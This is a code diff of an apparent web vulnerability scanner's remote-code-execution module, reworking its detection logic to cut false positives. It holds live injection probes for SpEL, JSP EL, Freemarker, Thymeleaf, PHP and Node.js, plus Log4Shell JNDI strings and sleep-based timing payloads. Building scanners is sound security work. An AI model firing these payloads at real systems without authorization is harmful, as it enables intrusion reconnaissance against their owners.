@@ -27,194 +27,130 @@ class RCEModule(BaseModule):
         """Initialize RCE module"""
         super().__init__(module_path, payload_limit=payload_limit)
 
-        # Generate unique markers
-        self.marker = ''.join(random.choices(string.ascii_lowercase, k=8))
-        self.marker_num = random.randint(100000, 999999)
-        self.expected_result = str(self.marker_num * 2)
+        # Generate unique markers using MATH - the expected result is NEVER in the payload
+        # This prevents false positives from payload reflection in error messages
+        self.num1 = random.randint(10000, 99999)
+        self.num2 = random.randint(10000, 99999)
+        self.expected_math = str(self.num1 * self.num2)  # e.g., "1234567890"
+
+        # For string-based tests, use a marker that won't be reflected
+        self.marker_base = ''.join(random.choices(string.ascii_lowercase, k=6))
 
         # Canary domain for OOB detection (placeholder)
-        self.canary_domain = f"{self.marker}.oob.example.com"
+        self.canary_domain = f"{self.marker_base}.oob.example.com"
 
         # Initialize payload categories
         self._init_payloads()
 
-        logger.info(f"RCE module loaded with multiple payload categories")
+        logger.info(f"RCE module loaded: math check {self.num1}*{self.num2}={self.expected_math}")
 
     def _init_payloads(self):
-        """Initialize all RCE payload categories"""
+        """Initialize all RCE payload categories
 
-        # Spring Expression Language (SpEL) payloads
+        CRITICAL: All payloads use MATH expressions where the expected result
+        is NEVER contained in the payload itself. This prevents false positives
+        when payloads are reflected in error messages.
+        """
+
+        # Spring Expression Language (SpEL) payloads - MATH ONLY
         self.spel_payloads = [
             {
-                'payload': '${7*7}',
-                'detect': '49',
+                'payload': f'${{{self.num1}*{self.num2}}}',
+                'detect': self.expected_math,
                 'description': 'Spring SpEL arithmetic evaluation',
                 'severity': 'Critical'
             },
             {
-                'payload': '*{7*7}',
-                'detect': '49',
+                'payload': f'*{{{self.num1}*{self.num2}}}',
+                'detect': self.expected_math,
                 'description': 'Spring SpEL (asterisk syntax)',
                 'severity': 'Critical'
             },
-            {
-                'payload': '${T(java.lang.System).getenv()}',
-                'detect': r'(PATH|HOME|USER|JAVA_HOME)',
-                'description': 'Spring SpEL environment disclosure',
-                'severity': 'High',
-                'regex': True
-            },
-            {
-                'payload': f'${{T(java.lang.Math).random()}}',
-                'detect': r'0\.[0-9]+',
-                'description': 'Spring SpEL Math.random()',
-                'severity': 'Critical',
-                'regex': True
-            },
-            {
-                'payload': f'${{"" + {self.marker_num}*2}}',
-                'detect': self.expected_result,
-                'description': 'Spring SpEL string concat with math',
-                'severity': 'Critical'
-            },
         ]
 
-        # JSP Expression Language payloads
+        # JSP Expression Language payloads - MATH ONLY
         self.el_payloads = [
             {
-                'payload': '${applicationScope}',
-                'detect': r'(javax|jakarta|application)',
-                'description': 'JSP EL application scope access',
-                'severity': 'High',
-                'regex': True
-            },
-            {
-                'payload': f'${{"{self.marker}"}}',
-                'detect': self.marker,
-                'description': 'JSP EL string evaluation',
+                'payload': f'${{{self.num1}*{self.num2}}}',
+                'detect': self.expected_math,
+                'description': 'JSP EL arithmetic evaluation',
                 'severity': 'Critical'
-            },
-            {
-                'payload': '${pageContext.request.serverName}',
-                'detect': r'[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
-                'description': 'JSP EL server name disclosure',
-                'severity': 'Medium',
-                'regex': True
             },
         ]
 
-        # Freemarker SSTI -> RCE
+        # Freemarker SSTI -> RCE - MATH ONLY
         self.freemarker_payloads = [
             {
-                'payload': '${.version}',
-                'detect': r'[0-9]+\.[0-9]+',
-                'description': 'Freemarker version disclosure',
-                'severity': 'High',
-                'regex': True
-            },
-            {
-                'payload': '${7*7}',
-                'detect': '49',
-                'description': 'Freemarker arithmetic',
-                'severity': 'Critical'
-            },
-            {
-                'payload': f'${{{self.marker_num}*2}}',
-                'detect': self.expected_result,
+                'payload': f'${{{self.num1}*{self.num2}}}',
+                'detect': self.expected_math,
                 'description': 'Freemarker expression evaluation',
                 'severity': 'Critical'
             },
         ]
 
-        # Thymeleaf SSTI -> RCE
+        # Thymeleaf SSTI -> RCE - MATH ONLY
         self.thymeleaf_payloads = [
             {
-                'payload': f'__${{7*7}}__::.x',
-                'detect': '49',
-                'description': 'Thymeleaf preprocessor expression',
-                'severity': 'Critical'
-            },
-            {
-                'payload': f'__${{{self.marker_num}*2}}__::.x',
-                'detect': self.expected_result,
+                'payload': f'__${{{self.num1}*{self.num2}}}__::.x',
+                'detect': self.expected_math,
                 'description': 'Thymeleaf preprocessor RCE',
                 'severity': 'Critical'
             },
         ]
 
-        # Log4Shell / JNDI injection (info disclosure based)
+        # Log4Shell / JNDI injection (error-based detection only)
+        # STRICT: Only match very specific error messages
         self.log4shell_payloads = [
             {
                 'payload': '${jndi:ldap://127.0.0.1/test}',
-                'detect': r'(jndi|ldap|lookup|javax\.naming)',
-                'description': 'Log4Shell JNDI (error-based detection)',
-                'severity': 'Critical',
-                'regex': True
-            },
-            {
-                'payload': '${${lower:j}ndi:ldap://127.0.0.1/a}',
-                'detect': r'(jndi|ldap|lookup)',
-                'description': 'Log4Shell obfuscated (lower)',
-                'severity': 'Critical',
-                'regex': True
-            },
-            {
-                'payload': '${java:version}',
-                'detect': r'Java|OpenJDK|[0-9]+\.[0-9]+\.[0-9]+',
-                'description': 'Log4j Java version lookup',
-                'severity': 'High',
-                'regex': True
-            },
-            {
-                'payload': '${env:PATH}',
-                'detect': r'(bin|usr|windows)',
-                'description': 'Log4j environment variable lookup',
+                'detect': r'javax\.naming\.NameNotFoundException|javax\.naming\.NamingException',
+                'description': 'Log4Shell JNDI (error-based)',
                 'severity': 'High',
                 'regex': True
             },
         ]
 
-        # PHP-specific RCE
+        # PHP-specific RCE - MATH ONLY (no echo with markers!)
+        # The key insight: <?php echo 7*7 ?> outputs "49" NOT "<?php echo 7*7 ?>"
         self.php_payloads = [
             {
-                'payload': f"<?php echo '{self.marker}'; ?>",
-                'detect': self.marker,
-                'description': 'PHP code injection',
+                'payload': f'<?php echo {self.num1}*{self.num2}; ?>',
+                'detect': self.expected_math,
+                'description': 'PHP code injection (math)',
                 'severity': 'Critical'
             },
             {
-                'payload': f"<?='{self.marker}'?>",
-                'detect': self.marker,
-                'description': 'PHP short tag injection',
+                'payload': f'<?={self.num1}*{self.num2}?>',
+                'detect': self.expected_math,
+                'description': 'PHP short tag injection (math)',
                 'severity': 'Critical'
             },
             {
                 'payload': 'phpinfo()',
-                'detect': r'PHP Version|php\.ini',
+                'detect': r'<title>phpinfo\(\)</title>|PHP Version \d+\.\d+',
                 'description': 'PHP phpinfo() execution',
                 'severity': 'Critical',
                 'regex': True
             },
         ]
 
-        # Node.js RCE
+        # Node.js RCE - MATH ONLY
         self.nodejs_payloads = [
             {
-                'payload': 'process.platform',
-                'detect': r'(win32|linux|darwin)',
-                'description': 'Node.js process access',
-                'severity': 'Critical',
-                'regex': True
+                'payload': f'{self.num1}*{self.num2}',
+                'detect': self.expected_math,
+                'description': 'Node.js arithmetic evaluation',
+                'severity': 'Critical'
             },
             {
-                'payload': 'constructor.constructor("return 1+1")()',
-                'detect': '2',
-                'description': 'Node.js constructor chaining',
+                'payload': f'eval({self.num1}*{self.num2})',
+                'detect': self.expected_math,
+                'description': 'Node.js eval() execution',
                 'severity': 'Critical'
             },
         ]
 
-        # Time-based RCE detection
+        # Time-based RCE detection (separate - no reflection issue)
         self.time_based_payloads = [
             {
                 'payload': '${T(java.lang.Thread).sleep(5000)}',
@@ -227,9 +163,9 @@ class RCEModule(BaseModule):
                 'description': 'Thymeleaf Thread.sleep()'
             },
             {
-                'payload': 'sleep(5)',
+                'payload': '<?php sleep(5); ?>',
                 'delay': 5,
-                'description': 'Generic sleep() time-based'
+                'description': 'PHP sleep() time-based'
             },
         ]
 
@@ -307,7 +243,7 @@ class RCEModule(BaseModule):
                                 continue
                             matched_value = match.group(0)
 
-                            # FALSE POSITIVE CHECK
+                            # FALSE POSITIVE CHECK - not in baseline
                             if re.search(detect_pattern, baseline_text, re.IGNORECASE):
                                 continue
                         else:
@@ -315,9 +251,15 @@ class RCEModule(BaseModule):
                                 continue
                             matched_value = detect_pattern
 
-                            # FALSE POSITIVE CHECK
+                            # FALSE POSITIVE CHECK - not in baseline
                             if detect_pattern in baseline_text:
                                 continue
+
+                        # CRITICAL: Check if payload is reflected in response (error message)
+                        # If payload appears in response, the "detection" might just be reflection
+                        if self._is_payload_reflected(payload, response_text):
+                            logger.debug(f"RCE: Payload reflected - skipping false positive")
+                            continue
 
                         # CONFIRMED VULNERABILITY
                         evidence = self._build_evidence(
@@ -443,8 +385,9 @@ class RCEModule(BaseModule):
                     response = http_client.get(url, params=test_params, timeout=15)
                 elapsed = time.time() - start
 
-                # Check for significant delay
-                if elapsed >= expected_delay - 0.5 and elapsed > baseline_time + 3:
+                # Check for significant delay - STRICT: must be at least expected_delay AND 4s more than baseline
+                # This reduces false positives from slow servers
+                if elapsed >= expected_delay - 0.5 and elapsed > baseline_time + 4:
                     evidence = f"""Time-Based RCE Detected
 
 **URL:** {url}
@@ -496,12 +439,20 @@ confirming code execution on the server.
         return None
 
     def _test_log4shell_headers(self, url: str, http_client: Any) -> List[Dict[str, Any]]:
-        """Test HTTP headers for Log4Shell vulnerability"""
+        """Test HTTP headers for Log4Shell vulnerability - STRICT detection"""
         results = []
 
-        headers_to_test = ['User-Agent', 'X-Forwarded-For', 'X-Api-Version', 'Referer']
+        # Only test critical headers, and use very specific error patterns
+        headers_to_test = ['User-Agent', 'X-Api-Version']
 
-        for payload_info in self.log4shell_payloads[:2]:
+        # Get baseline first to check for pre-existing error messages
+        try:
+            baseline_response = http_client.get(url, timeout=5)
+            baseline_text = baseline_response.text.lower() if baseline_response else ''
+        except:
+            baseline_text = ''
+
+        for payload_info in self.log4shell_payloads[:1]:  # Only test first payload
             payload = payload_info['payload']
             description = payload_info['description']
 
@@ -511,26 +462,37 @@ confirming code execution on the server.
                     response = http_client.get(url, headers=custom_headers, timeout=5)
 
                     if response and response.text:
-                        # Check for error indicators
-                        error_indicators = ['jndi', 'lookup', 'ldap', 'rmi', 'javax.naming']
-                        for indicator in error_indicators:
-                            if indicator.lower() in response.text.lower():
+                        response_lower = response.text.lower()
+
+                        # STRICT: Only match very specific Log4j error patterns
+                        # Generic words like "jndi" or "lookup" cause too many false positives
+                        strict_indicators = [
+                            'javax.naming.namenotfoundexception',
+                            'javax.naming.namingexception',
+                            'jndilookup',
+                            'log4j2.formatmsgnolookups',
+                            'log4j jndi',
+                            'invalid jndi'
+                        ]
+
+                        for indicator in strict_indicators:
+                            # Must be NEW in response (not in baseline)
+                            if indicator in response_lower and indicator not in baseline_text:
                                 evidence = f"""Possible Log4Shell Vulnerability
 
 **URL:** {url}
 **Injection Point:** {header_name} header
 **Payload:** {payload}
 
-**Detection:** Error-based - JNDI/lookup keywords in response
-**Matched:** {indicator}
+**Detection:** Error-based - Log4j/JNDI error in response
+**Matched Pattern:** {indicator}
 
 **Note:** For full confirmation, use an out-of-band callback server
-to verify JNDI lookups are being made.
+to verify JNDI lookups are being made. This is error-based detection only.
 
 **Security Impact:**
 - Remote Code Execution
 - CVE-2021-44228 (Log4Shell)
-- Complete server compromise
 """
 
                                 result = self.create_result(
@@ -540,8 +502,8 @@ to verify JNDI lookups are being made.
                                     payload=payload,
                                     evidence=evidence,
                                     description=f"Possible Log4Shell: {description}",
-                                    confidence=0.75,
-                                    severity='Critical',
+                                    confidence=0.70,
+                                    severity='High',  # Downgraded from Critical - needs OOB confirmation
                                     method='GET (Header)',
                                     response=response.text[:2000]
                                 )
@@ -552,13 +514,44 @@ to verify JNDI lookups are being made.
 
                                 results.append(result)
                                 logger.warning(f"Possible Log4Shell in {header_name}")
-                                break
+                                return results  # One finding is enough
 
                 except Exception as e:
                     logger.debug(f"Error testing Log4Shell header: {e}")
                     continue
 
         return results
+
+    def _is_payload_reflected(self, payload: str, response_text: str) -> bool:
+        """
+        Check if the payload is reflected in the response (e.g., in error messages)
+
+        Returns True if payload appears to be reflected (false positive risk)
+        """
+        import html
+        import urllib.parse
+
+        # Check raw payload
+        if payload in response_text:
+            return True
+
+        # Check URL-encoded payload
+        if urllib.parse.quote(payload) in response_text:
+            return True
+
+        # Check HTML-encoded payload
+        if html.escape(payload) in response_text:
+            return True
+
+        # Check partial payload - the distinctive math expression
+        # For "${12345*67890}" check if "12345*67890" appears
+        math_match = re.search(r'(\d{4,})\s*\*\s*(\d{4,})', payload)
+        if math_match:
+            math_expr = f"{math_match.group(1)}*{math_match.group(2)}"
+            if math_expr in response_text:
+                return True
+
+        return False
 
     def _build_evidence(self, url: str, param: str, payload: str, desc: str,
                          match: str, response: str, tech: str, method: str) -> str:
